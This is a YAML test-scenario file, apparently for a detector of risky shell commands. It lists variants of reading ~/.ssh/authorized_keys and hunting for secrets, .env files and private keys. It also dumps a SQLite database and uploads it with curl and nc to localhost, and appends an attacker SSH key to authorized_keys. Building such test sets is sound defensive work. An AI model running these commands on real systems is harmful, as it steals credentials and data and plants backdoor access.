data:
  - id: a
    name: unapproved_path_read
    steps:
      - step: 1
        commands:
          - cat ~/.ssh/authorized_keys
          - xxd ~/.ssh/authorized_keys
          - hexdump ~/.ssh/authorized_keys
          - awk 1 ~/.ssh/authorized_keys
          - head -100 ~/.ssh/authorized_keys
          - while IFS= read -r line; do printf '%s\n' "$line"; done < ~/.ssh/authorized_keys
          # - VAR=$(<~/.ssh/authorized_keys)
          - grep . ~/.ssh/authorized_keys
          - find ~/.ssh -name authorized_keys -exec cat {} \;
          - busybox cat ~/.ssh/authorized_keys
          - tr -d '' < ~/.ssh/authorized_keys
          - sed '' ~/.ssh/authorized_keys
          - strings ~/.ssh/authorized_keys
          - printf '%s\n' "$(<~/.ssh/authorized_keys)"
        in_memory:
          - data/a/1_1.py
  - id: b
    name: extract
    steps:
      - step: 1
        setup:
          - sqlite3 board.db .dump > /tmp/dump.sql
          - sqlite3 board.db .dump > dump_.sql
        cleanup:
          - rm -r /tmp/dump.sql
          - rm -r dump_.sql
        commands:
          - cat /tmp/dump.sql | base64
          - curl -X POST -F "file=@/tmp/dump.sql" http://127.0.0.1:12345/upload
          - curl -X POST -F "file=@./dump_.sql" http://127.0.0.1:12345/upload
          # - exec 3<>/dev/tcp/127.0.0.1/1234; cat /tmp/dump.sql >&3 # nc -lvp 1234
          - nc 127.0.0.1 1234 < /tmp/dump.sql
        in_memory:
          - data/3/3_1.py
      - step: 2
        name: c
      - step: 3
        setup:
          - sqlite3 board.db .dump > /tmp/dump.sql
        cleanup:
          - rm -r /tmp/dump.sql
        commands:
          - while read -r line; do printf "%s" "$line"; done < /tmp/dump.sql > ./static/uploads/attachments/019f16367a8e40fc8e8505856f57f746.txt

  - id: c
    name: find upload dir
    steps:
      - step: 1
        commands:
          - "find . -type d -iname '*upload*' -o -iname '*attach*' -o -iname '*media*' -o -name '*.jpeg' -o -name '*.jpg' -o -name '*.png'"
          - grep -Rl 'PNG\|Hello World Signature' .
        in_memory:
          - data/9/1_1.py

  - id: 1
    name: asdf
    steps:
      - step: 1
        commands:
          - find . -name .env -o -iname *config*
          - find ~/.ssh -name "id_*"
          - ls -laR
          - ls -laR ~/.ssh
          - echo *
          - echo ~/.ssh/*
          - find . -name .e??
          - for f in $(find .); do printf "$f"; done;
          - for f in $(find ~/.ssh); do printf "$f"; done;
          - busybox find . -name .env -o -iname *config*
          - busybox find ~/.ssh -name "id_*"
          - grep -RIl 'SECRET\|PASSWORD\|_URL' .
          - grep -RIl 'ssh-*' ~/.ssh
        in_memory:
          - data/1/1_1.py
      - step: 2
        name: asdf
  - id: 2
    name: fasdfasdfsad
    steps:
      - step: 1
        commands:
          - find ~/ -name authorized_keys
          - find ~/ -name authorized*
          - ls -laR ~/
          - echo ~/*
          - echo ~/*/*
          - echo ~/*/*/*
          - echo ~/.ssh/auth*
          - for f in $(find ~/); do printf "$f\n"; done;
          - busybox find ~/ -name authorized*
          - grep -RIl 'ssh-' ~/.ssh
        in_memory:
          - data/2/1_1.py
          - data/2/1_2.py
      - step: 2
        name: cat

      - step: 3
        setup:
          - cat ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.backup
        cleanup:
          - cat ~/.ssh/authorized_keys.backup > ~/.ssh/authorized_keys
        commands:
          - "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6CAKUF9Hg6v9rHPko44XC1y2vDuomF8+nnZPJZWCde your_email@example.com' >> ~/.ssh/authorized_keys"
        in_memory:
